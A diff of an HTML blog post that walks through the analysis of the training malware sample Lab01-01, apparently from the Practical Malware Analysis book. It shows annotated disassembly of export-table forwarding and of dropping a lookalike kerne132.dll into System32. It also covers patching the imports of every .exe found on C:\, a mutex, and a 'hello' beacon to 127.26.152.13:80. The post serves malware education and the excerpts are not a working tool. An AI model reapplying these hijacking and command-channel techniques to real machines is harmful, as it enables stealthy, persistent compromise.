@@ -29,8 +29,8 @@
 <p><br /></p>
 
 <p><strong>Tools:</strong> IDA Free 7.0
-<strong>Prerequistes:</strong> <a href="/cheatsheets/pe/#import_table">import table</a>, <a href="/cheatsheets/pe/#export_table">export table</a>
-<strong>IDA databases:</strong> <a href="/assets/series/pma/Lab01-01_exe.i64">Lab01-01_exe.i64</a> <a href="/assets/series/pma/Lab01-01_dll.i64">Lab01-01_dll.i64</a><br />
+<strong>IDA databases:</strong> <a href="/assets/series/pma/Lab01-01_exe.i64">Lab01-01_exe.i64</a> <a href="/assets/series/pma/Lab01-01_dll.i64">Lab01-01_dll.i64</a>
+<strong>Keywords:</strong> <a href="/cheatsheets/pe/#import_table">import table</a>, <a href="/cheatsheets/pe/#export_table">export table</a>, export forwarding<br />
 <a href=""></a></p>
 
 <table>
@@ -62,10 +62,10 @@
 The malicious <a href="#exe_analysis">EXE</a>:</p>
 <ul>
   <li><a href="#rebuild_dll">Rebuilds</a> the export table of the malicious DLL;</li>
-  <li><a href="#filesystem_alteration">Modifies</a> part of the filesystem, so the malicious DLL is loaded when executables from the <em>System32</em> folder are executed;<br />
+  <li><a href="#filesystem_alteration">Modifies</a> part of the filesystem, so the malicious DLL is loaded when executables from the folder <strong>C:\Windows\System32\</strong> folder are executed;<br />
 The malicious <a href="#dll_analysis">DLL</a>:</li>
-  <li><a href="#mutex">Creates</a> a mutex named “<em>SADFHUHF</em>”;</li>
-  <li><a href="#socket">Opens</a> a socket to 127.26.152.13:80 an sends a “<em>hello</em>” beacon;</li>
+  <li><a href="#mutex">Creates</a> a mutex named <strong>SADFHUHF</strong>;</li>
+  <li><a href="#socket">Opens</a> a socket to <strong>127.26.152.13:80</strong> an sends a “<em>hello</em>” beacon;</li>
   <li><a href="#commands">Processes</a> received commands.</li>
 </ul>
 
@@ -73,7 +73,7 @@ The malicious <a href="#dll_analysis">DLL</a>:</li>
 
 <h3 id="anti-fatfingers">Anti-fatfingers</h3>
 
-<p>A check of the command line is implemented to avoid the accidental execution of the malware. First, <em>argc</em> and <em>argv</em> are passed to the <em>_main()</em> function:</p>
+<p>A check of the command line is implemented to avoid the accidental execution of the malware. First, <em>argc</em> and <em>argv</em> are passed to the function <em>_main()</em>:</p>
 
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004018BF</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">_StartupInfo</span><span class="p">]</span>
 <span class="err">0</span><span class="nf">x004018C2</span>    <span class="nv">push</span>    <span class="nb">eax</span>
@@ -104,7 +104,7 @@ The malicious <a href="#dll_analysis">DLL</a>:</li>
 <span class="err">0</span><span class="nf">x0040144E</span>    <span class="nv">jnz</span>     <span class="nv">quit</span> <span class="c1">; exit if argc != 2</span>
 </code></pre></div></div>
 
-<p>Finally, it checks if the second argument matches the string “WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”:</p>
+<p>Finally, it checks if the second argument matches the string “<em>WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</em>”:</p>
 
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401454</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">54h</span><span class="o">+</span><span class="nv">argv</span><span class="p">]</span>
 <span class="err">0</span><span class="nf">x00401458</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nv">offset</span> <span class="nv">aWarni</span> <span class="c1">; string</span>
@@ -131,7 +131,7 @@ The malicious <a href="#dll_analysis">DLL</a>:</li>
 <span class="err">0</span><span class="nf">x00401484</span>    <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span> <span class="c1">; good boy</span>
 <span class="err">0</span><span class="nf">x00401486</span>    <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">loc_40148D</span>
 </code></pre></div></div>
-<p>If both strings match, we reach the address <em>0x401484</em>. There, <em>eax</em> is set to zero and then the code jumps to <em>0x40148D</em>. This can be bypassed in many ways. I’ve chosen to patch the conditional <em>jnz</em> of the first check (<em>0x0040144E</em>) with this:</p>
+<p>If both strings match, we reach the address <em>0x401484</em>. There, <em>eax</em> is set to zero and then the code jumps to <em>0x40148D</em>. This can be bypassed in many ways. I’ve chosen to patch the conditional <em>jnz</em> of the first check with this:</p>
 
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x0040144E</span>    <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
 <span class="err">0</span><span class="nf">x00401450</span>    <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">loc_40148D</span>
@@ -142,13 +142,13 @@ The malicious <a href="#dll_analysis">DLL</a>:</li>
 <p>The malicious executable uses the legitimate <em>kernel32.dll</em> found on the system to rebuild the malicious DLL. The 3 main steps are:</p>
 <ul>
   <li><a href="#memory_mapping_1">Mapping</a> both <em>kernel32.dll</em> and <em>Lab01-01.dll</em> into its own address space;</li>
-  <li><a href="#rebuild_export_dir">Rebuilding</a> the IMAGE_EXPORT_DIRECTORY of <em>Lab01-01.dll</em>;</li>
+  <li><a href="#rebuild_export_dir">Rebuilding</a> the <strong>IMAGE_EXPORT_DIRECTORY</strong> of <em>Lab01-01.dll</em>;</li>
   <li><a href="#rebuild_eat_enpt_eot_ent">Rebuilding</a> the <strong>ExportAddressTable</strong>, <strong>ExportOrdinalTable</strong>, <strong>ExportNamePointerTable</strong>, and <strong>ExportNameTable</strong> of <em>Lab01-01.dll</em>.</li>
 </ul>
 
 <h4 id="memory_mapping_1">Mapping <em>kernel32.dll</em> and <em>Lab01-01.dll</em></h4>
 
-<p>Both DLLs are mapped using the following 3 APIs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea"><em>CreateFileA</em></a>, <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga"><em>CreateFileMappingA</em></a>, and <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile"><em>MapViewOfFile</em></a>. The legitimate <em>kernel32.dll</em> is mapped with <em>read</em> permission, while <em>Lab01-01.dll</em> is mapped with <em>read</em> and <em>write</em> permissions. Snippets below detail the mapping of <em>kernel32.dll</em>:</p>
+<p>Both DLLs are mapped using the following 3 APIs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">CreateFileA</a>, <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga">CreateFileMappingA</a>, and <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile">MapViewOfFile</a>. The legitimate <em>kernel32.dll</em> is mapped with <em>read</em> permission, while <em>Lab01-01.dll</em> is mapped with <em>read</em> and <em>write</em> permissions. Snippets below detail the mapping of <em>kernel32.dll</em>:</p>
 
 <ol>
   <li>First, get a file handle with <em>read</em> permission:
@@ -191,7 +191,7 @@ The malicious <a href="#dll_analysis">DLL</a>:</li>
 </ol>
 
 <p>As stated above, the same 3 APIs are used to map the malicious DLL with <em>read</em> and <em>write</em> permissions (code not shown for brevity). An important thing to note is we have a 1:1 correspondence between the mapped view and the file on disk, meaning both will be aligned according to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#members">FileAlignment</a> field of the PE. If they were loaded using <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a>, the memory image would have been aligned according to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#members">SectionAlignment</a> field of the PE.<br />
-Let’s continue after the second call to <em>MapViewofFile</em> (seen at address <em>0x401525</em>).</p>
+Let’s continue after the second call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile">MapViewofFile</a> (seen at address <em>0x401525</em>).</p>
 
 <h4 id="rebuild_export_dir">Rebuilding the IMAGE_EXPORT_DIRECTORY</h4>
 
@@ -222,9 +222,12 @@ Let’s continue after the second call to <em>MapViewofFile</em> (seen at addres
 <ul>
   <li>RVA is the value to convert;</li>
   <li>ntHeaders points to the <em>PE\x00\x00</em> signature;</li>
-  <li>imageBase is the address of the mapped view (returned by <em>MapviewofFile</em> API).<br />
-<br />
-The 5 calls allow retrieving the addresses of:</li>
+  <li>imageBase is the base address of the mapped view.</li>
+</ul>
+
+<p><a href=""></a>
+The 5 calls allow retrieving the addresses of:</p>
+<ul>
   <li><strong>Export Directory</strong> of <em>kernel32.dll</em></li>
   <li><strong>Export Directory</strong> of <em>Lab01-01.dll</em></li>
   <li><strong>AddressOfFunctions</strong> of <em>kernel32.dll</em></li>
@@ -237,23 +240,23 @@ The following section details the conversion, but you can still <a href="#copy_e
 
 <h5 id="rabbit-hole-converting-a-rva-to-a-mapped-address">Rabbit hole: converting a RVA to a mapped address</h5>
 
-<p>When a module is loaded into memory (e.g. with a call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a>), its sections are aligned according to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#members"><strong>SectionAlignment</strong></a> field (default = page size, <em>0x1000</em> on my system). Hence, to get a virtual address from a RVA all we have to do is:</p>
+<p>When a module is loaded into memory (e.g. with a call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a>), its sections are aligned according to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#members">SectionAlignment</a> field (default = page size, <em>0x1000</em> on my system). Hence, to get a virtual address from a RVA all we have to do is:</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RVA + ImageBase = virtual address
 </code></pre></div></div>
 
-<p>In our case, however, both <em>kernel32.dll</em> and <em>Lab01-01.dll</em> are mapped with calls to <em>MapViewOfFile</em>, meaning we have a 1:1 correspondence between a mapped image and its corresponding file on disk. This implies the mapped image is aligned according to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#members"><strong>FileAlignment</strong></a> field (default is 0x200). Consequently, to compute the address indicated by a given RVA, we need to take into account these alignment differences. This is done in 3 steps:</p>
+<p>In our case, however, both <em>kernel32.dll</em> and <em>Lab01-01.dll</em> are mapped with calls to <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile">MapViewOfFile</a>, meaning we have a 1:1 correspondence between a mapped image and its corresponding file on disk. This implies the mapped image is aligned according to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#members">FileAlignment</a> field (default is 0x200). Consequently, to compute the address indicated by a given RVA, we need to take into account these alignment differences. This is done in 3 steps:</p>
 
 <ol>
-  <li>Identify the section containing the value of the RVA: it is the purpose of the function <em>0x401000</em> (here renamed LocateHeaderOfSectionContainingRVA):
+  <li>Identify the section containing the value of the RVA: it is the purpose of the function <em>0x401000</em> (here renamed <em>LocateHeaderOfSectionContainingRVA()</em>):
     <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401049</span>    <span class="nv">push</span>    <span class="nb">eax</span> <span class="c1">; -&gt;NtHeaders of kernel32</span>
 <span class="err">0</span><span class="nf">x0040104A</span>    <span class="nv">push</span>    <span class="nb">esi</span> <span class="c1">; RVA to convert</span>
 <span class="err">0</span><span class="nf">x0040104B</span>    <span class="nv">call</span>    <span class="nv">LocateHeaderOfSectionContainingRVA</span>
 <span class="err">0</span><span class="nf">x00401050</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>
 </code></pre></div>    </div>
-    <p>If we step into the function <em>LocateHeaderOfSectionContainingRVA</em> (code not shown), we see it parses an array of <strong>_IMAGE_SECTION_HEADER</strong> structures until the following condition matches:</p>
+    <p>If we step into the function <em>LocateHeaderOfSectionContainingRVA()</em> (code not shown), we see it parses an array of <strong>_IMAGE_SECTION_HEADER</strong> structures until the following condition matches:</p>
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_IMAGE_SECTION_HEADER.VirtualAddress &lt;= RVA &lt; (_IMAGE_SECTION_HEADER.Misc.VirtualAddress + _IMAGE_SECTION_HEADER.VirtualSize
 </code></pre></div>    </div>
-    <p>A pointer to the _IMAGE_SECTION_HEADER matching the above condition is returned.</p>
+    <p>A pointer to the <strong>_IMAGE_SECTION_HEADER</strong> matching the above condition is returned.</p>
   </li>
   <li>Then, the RVA is converted to a raw offset:
     <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ecx = pointer to _IMAGE_SECTION_HEADER</span>
@@ -294,7 +297,7 @@ The following section details the conversion, but you can still <a href="#copy_e
 <span class="err">0</span><span class="nf">x004015C0</span>    <span class="nv">rep</span> <span class="nv">movsd</span>        <span class="c1">; overwrite </span>
 </code></pre></div></div>
 
-<p>Instruction <a href="https://c9x.me/x86/html/file_module_x86_id_203.html"><em>rep movsd</em></a> copies <em>ecx</em> <strong>dwords</strong> from the source address pointed by <em>esi</em> to the destination address pointed by <em>edi</em>. The value of <em>ecx</em> comes from <strong>IMAGE_DATA_DIRECTORY[0].Size</strong> (<em>0xA9B1</em>.. Code not shown, but it’s the value at <em>PE+0x7C</em>). Because <em>movsd</em> is used, <em>ecx</em> has to be divided by 4 (1 dword = 4 bytes); this is the purpose instruction <em>shr ecx, 2</em>. Indeed: <em>shr x, y</em> = <em>x/(2**y)</em> (and <em>shl x, y</em> = <em>x*(y**2)</em>).</p>
+<p>Instruction <a href="https://c9x.me/x86/html/file_module_x86_id_203.html"><em>rep movsd</em></a> copies <em>ecx</em> <strong>dwords</strong> from the source address pointed by <em>esi</em> to the destination address pointed by <em>edi</em>. The value of <em>ecx</em> comes from <strong>IMAGE_DATA_DIRECTORY[0].Size</strong> (<em>0xA9B1</em>. Code not shown, but it’s the value at <em>PE+0x7C</em>). Because <em>movsd</em> is used, <em>ecx</em> has to be divided by 4 (1 dword = 4 bytes); this is the purpose instruction <em>shr ecx, 2</em>. Indeed: <em>shr x, y</em> = <em>x/(2**y)</em> (and <em>shl x, y</em> = <em>x*(y**2)</em>).</p>
 
 <p>If the overall size to copy is not dword-aligned (i.e. between 1 and 3 bytes remain to be copied), the remaining bytes are copied with instruction <em>rep movsb</em>, which copy <em>ecx</em> <strong>bytes</strong> from <em>esi</em> to <em>edi</em>:</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004015C2</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">edx</span> <span class="p">:</span> <span class="nb">si</span><span class="nv">ze</span> <span class="nv">of</span> <span class="nv">export</span> <span class="nb">di</span><span class="nv">rectory</span>
@@ -348,7 +351,7 @@ The following section details the conversion, but you can still <a href="#copy_e
 <span class="err">0</span><span class="nf">x004015DC</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">18h</span><span class="p">],</span> <span class="nb">edx</span>  <span class="c1">; update NumberOfNames </span>
 </code></pre></div></div>
 
-<p>Then comes the baptism of the malicious DLL: the string <em>kerne123.dll</em> is written just after its export directory with several <em>mov</em> (note the number “1” instead of the lowercase “l”) :</p>
+<p>Then comes the baptism of the malicious DLL: the string <em>kerne123.dll</em> is written just after its export directory with several <em>mov</em> instructions (note the number “<strong>1</strong>” instead of the lowercase “<strong>l</strong>”) :</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebp-&gt;Export directory of malicious dll</span>
 <span class="err">0</span><span class="nf">x004015D9</span>    <span class="nv">lea</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="mh">28h</span><span class="p">]</span>  <span class="c1">; end of export directory</span>
 <span class="err">[</span><span class="nf">...</span><span class="p">]</span>
@@ -373,7 +376,7 @@ The function we are interested in is called at address <em>0x4015B0</em>:</p>
 <span class="err">0</span><span class="nf">x004015AF</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; RVA</span>
 <span class="err">0</span><span class="nf">x004015B0</span>    <span class="nv">call</span>    <span class="nv">ComputeMagicDelta</span>
 </code></pre></div></div>
-<p>The magic delta computed will be used to convert any mapped address to an RVA. The way it has been implemented perplexes me, but it does the job. <a href="#upd_export_dir_2">Skip another rabbit hole</a>.</p>
+<p>The magic delta computed will be used to convert any mapped address to an RVA. The way it has been implemented perplexed me, but it does the job. <a href="#upd_export_dir_2">Skip another rabbit hole</a>.</p>
 
 <h5 id="rabbit-hole-converting-a-mapped-address-to-an-rva">Rabbit hole: converting a mapped address to an RVA</h5>
 
@@ -447,9 +450,9 @@ Two other addresses are computed, let’s call them “<em>array2</em>” and �
 </code></pre></div></div>
 <p>And suddently, it becomes clear:</p>
 <ul>
-  <li>array1 = malicious ExportAddressTable</li>
-  <li>array2 = malicious ExportOrdinalTable</li>
-  <li>array3 = malicious ExportNamePointerTable</li>
+  <li>array1 = malicious <strong>ExportAddressTable</strong></li>
+  <li>array2 = malicious <strong>ExportOrdinalTable</strong></li>
+  <li>array3 = malicious <strong>ExportNamePointerTable</strong></li>
 </ul>
 
 <p>For a refreasher, have a look at my <a href="/cheatsheets/pe/#export_table"><strong>export table</strong> cheatsheet</a>.<br />
@@ -537,13 +540,14 @@ Once the first entry of the <strong>ExportNamePointerTable</strong> is good, the
 <span class="err">0</span><span class="nf">x00401754</span>    <span class="nv">rep</span> <span class="nv">movsb</span>
 </code></pre></div></div>
 <p>All the <em>rep*</em>-based shenanigans have been explained in previous sections. After that, the different counters and pointers are updated, and the next API is processed (code not shown). <br />
-So, we finally have the first entry of the <strong>ExportAddressTable</strong> being the RVA of a string following the pattern “<em>Kernel32.apiname</em>”. This, plus the fact that the RVA relates to an address inside the export table (and not within the code section) indicates <strong>export forwarding</strong>. That is, the export table of the malicious DLL has been rebuilt to forward all calls made to it to the legitimate <em>kernel32.dll</em>. But, what would make a given binary to call an API from the malicious DLL ? This is what we’ll see in the next section.</p>
+So, we finally have the first entry of the <strong>ExportAddressTable</strong> being the RVA of a string following the pattern “<em>Kernel32.apiname</em>”. This, plus the fact that the RVA relates to an address inside the export table (and not within the code section) indicates <strong>export forwarding</strong>. That is, the export table of the malicious DLL has been rebuilt to forward all calls made to it to the legitimate <em>kernel32.dll</em>.
+But, why a given binary would call APIs of the malicious DLL? This is what we’ll see in the next section.</p>
 
 <h3 id="filesystem_alteration">Alteration of the filesystem</h3>
 
 <h4 id="dropping-the-malicious-dll-on-disk">Dropping the malicious DLL on disk</h4>
 
-<p>Now the malicious DLL is rebuilt, <em>Lab01-01.exe</em> writes it on disk inside the <em>C:\windows\system32</em> directory under the name <em>kerne123.dll</em> (recall the number “1” instead of the letter “l” <a href="#upd_export_dir_1">see earlier?</a>):</p>
+<p>Now the malicious DLL is rebuilt, the malware writes it to the path <strong>C:\windows\system32\kerne123.dll</strong> (recall the number “1” instead of the letter “l” <a href="#upd_export_dir_1">see earlier?</a>):</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004017E8</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; bFailIfExists</span>
 <span class="err">0</span><span class="nf">x004017EA</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">NewFileName</span> <span class="c1">; "C:\\windows\\system32\\kerne132.dll"</span>
 <span class="err">0</span><span class="nf">x004017EF</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">ExistingFileName</span> <span class="c1">; "Lab01-01.dll"</span>
@@ -552,13 +556,13 @@ So, we finally have the first entry of the <strong>ExportAddressTable</strong> b
 
 <h4 id="searching-for-valid-targets">Searching for valid targets</h4>
 
-<p>Then, a recursive function is called, taking the string “<em>C:\</em>” and the integer <em>0</em> as parameters:</p>
+<p>A recursive function is called, taking the string “<em>C:\*</em>” and the integer <em>0</em> as parameters:</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004017FC</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; recursion_depth</span>
 <span class="err">[</span><span class="nf">...</span><span class="p">]</span>
 <span class="err">0</span><span class="nf">x00401806</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aC</span>       <span class="c1">; "C:\\*"</span>
 <span class="err">0</span><span class="nf">x0040180B</span>    <span class="nv">call</span>    <span class="nv">RecurseFilesystem</span> <span class="c1">; 0x4011E0</span>
 </code></pre></div></div>
-<p>The function starts by comparing the integer parameter with the constant <em>7</em>, and exits if greater:</p>
+<p>The function starts by comparing the integer parameter with the constant <em>7</em> and exits if greater:</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004011E0</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="nv">recursion_depth</span><span class="p">]</span>
 <span class="err">0</span><span class="nf">x004011E4</span>    <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">144h</span>
 <span class="err">0</span><span class="nf">x004011EA</span>    <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">7</span>
@@ -566,7 +570,7 @@ So, we finally have the first entry of the <strong>ExportAddressTable</strong> b
 <span class="err">0</span><span class="nf">x004011F1</span>    <span class="nv">jg</span>      <span class="nv">exit</span>
 </code></pre></div></div>
 
-<p>If the level of recursion is less or equal to 7, the code flow reaches a call to the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea"><em>FindFirstFileA</em></a>:</p>
+<p>If the level of recursion is less or equal to 7, the code flow reaches a call to the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea">FindFirstFileA</a>:</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004011F7</span>    <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">lpFileName</span><span class="p">]</span>
 <span class="err">0</span><span class="nf">x004011FE</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">FindFileData</span><span class="p">]</span>
 <span class="err">0</span><span class="nf">x00401202</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpFindFileData </span>
@@ -574,12 +578,12 @@ So, we finally have the first entry of the <strong>ExportAddressTable</strong> b
 <span class="err">0</span><span class="nf">x00401204</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">FindFirstFileA</span>
 </code></pre></div></div>
 
-<p>After the call to <em>FindFirstFileA</em>, the return code is checked:</p>
+<p>After this call, the return code is checked:</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401219</span>   <span class="nv">test</span>    <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">FindFileData.dwFileAttributes</span><span class="p">],</span> <span class="nv">FILE_ATTRIBUTE_DIRECTORY</span>
 <span class="err">0</span><span class="nf">x0040121E</span>   <span class="nv">jz</span>      <span class="nv">not_a_dir</span>
 </code></pre></div></div>
-<p>If the call returns <em>FILE_ATTRIBUTE_DIRECTORY</em> (and the directory is neither “<em>.</em>” nor “<em>..</em>”), the name of the found directory is concatenated with the string used as <em>lpFileName</em> parameter for <em>FindFirstFileA</em> (thus building a new path), the depth parameter is incremented, and the function recurses (code not shown).<br />
-If the call returns a file, the last 4 chars of its filename are compared with the hardcoded string “<em>.exe</em>”. If the comparison doesn’t match, the search continues with a call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findnextfilea"><em>FindNextFileA</em></a>:</p>
+<p>If the call returns “<em>FILE_ATTRIBUTE_DIRECTORY</em>” (and the directory is neither “<em>.</em>” nor “<em>..</em>”), the name of the found directory is concatenated with the parameter <em>lpFileName</em> (thus building a new path), the depth parameter is incremented, and the function recurses (code not shown).<br />
+If the call returns a file, the last 4 chars of its filename are compared with the hardcoded string “<em>.exe</em>”. If the comparison doesn’t match, the search continues with a call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findnextfilea">FindNextFileA</a>:</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x0040136C</span>    <span class="nv">lea</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="nb">ecx</span><span class="o">+</span><span class="mh">154h</span><span class="o">+</span><span class="nv">FindFileData.dwReserved1</span><span class="p">]</span>
 <span class="err">[</span><span class="nf">...</span><span class="p">]</span>
 <span class="err">0</span><span class="nf">x004013A</span>     <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aExe</span>     <span class="c1">; ".exe"</span>
@@ -648,7 +652,7 @@ Then, a pointer to the name of the DLL is retrieved from the value of the field 
 <span class="err">0</span><span class="nf">x0040117D</span>    <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
 <span class="err">0</span><span class="nf">x0040117F</span>   <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">not_k32_thunk</span>
 </code></pre></div></div>
-<p>If the strings doesn’t match, the next <strong>IMAGE_IMPORT_DESCRIPTOR</strong> is checked. However, if the strings match, the string “<em>kernel32.dll</em>” is replaced with the string “<em>kerne132.dll</em>” (number “<em>1</em>” instead of letter “<em>l</em>”):</p>
+<p>If the strings doesn’t match, the next <strong>IMAGE_IMPORT_DESCRIPTOR</strong> is checked. However, if the strings match, “<em>kernel32.dll</em>” is replaced by “<em>kerne132.dll</em>” (number “<em>1</em>” instead of letter “<em>l</em>”):</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ebx-&gt;dll name</span>
 <span class="err">0</span><span class="nf">x00401181</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span>
 <span class="err">0</span><span class="nf">x00401183</span>    <span class="nv">or</span>      <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0FFFFFFFFh</span>
@@ -676,7 +680,7 @@ Then, a pointer to the name of the DLL is retrieved from the value of the field 
 
 <h3 id="mutex">Mutex</h3>
 
-<p>The <em>_DLLMain()</em> function starts by checking the existence of a mutex named “<em>SADFHUHF</em>” with a call to <em>OpenMutexA</em>. If the mutex already exists the codeflow jumps to the end of function, else the mutext is created:</p>
+<p>The <em>_DLLMain()</em> function starts by checking the existence of a mutex named “<strong>SADFHUHF</strong>” with a call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-openmutexw">OpenMutexA</a>. If the mutex already exists the codeflow jumps to the end of function, else the mutext is created:</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x10001067</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">Name</span>     <span class="c1">; "SADFHUHF"</span>
 <span class="err">0</span><span class="nf">x1000106C</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; bInitialOwner</span>
 <span class="err">0</span><span class="nf">x1000106D</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpMutexAttributes</span>
@@ -685,7 +689,7 @@ Then, a pointer to the name of the DLL is retrieved from the value of the field 
 
 <h3 id="socket">Socket</h3>
 
-<p>Then, a socket is created in order to communicate with IP address 127.26.152.13 on port 80:</p>
+<p>Then, a socket is created in order to communicate with IP address <strong>127.26.152.13</strong> on port <strong>80</strong>:</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x10001078</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpWSAData</span>
 <span class="err">0</span><span class="nf">x10001079</span>    <span class="nv">push</span>    <span class="mh">202h</span>            <span class="c1">; wVersionRequested</span>
 <span class="err">0</span><span class="nf">x1000107E</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">WSAStartup</span>   <span class="c1">; init. Winsock usage</span>
@@ -712,7 +716,7 @@ Then, a pointer to the name of the DLL is retrieved from the value of the field 
 <span class="err">0</span><span class="nf">x100010CE</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">connect</span>     <span class="c1">; connect to 127.26.152.13:80</span>
 </code></pre></div></div>
 
-<p>If the connection is successful, the string <em>hello</em> is sent with the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send"><em>send</em></a>:</p>
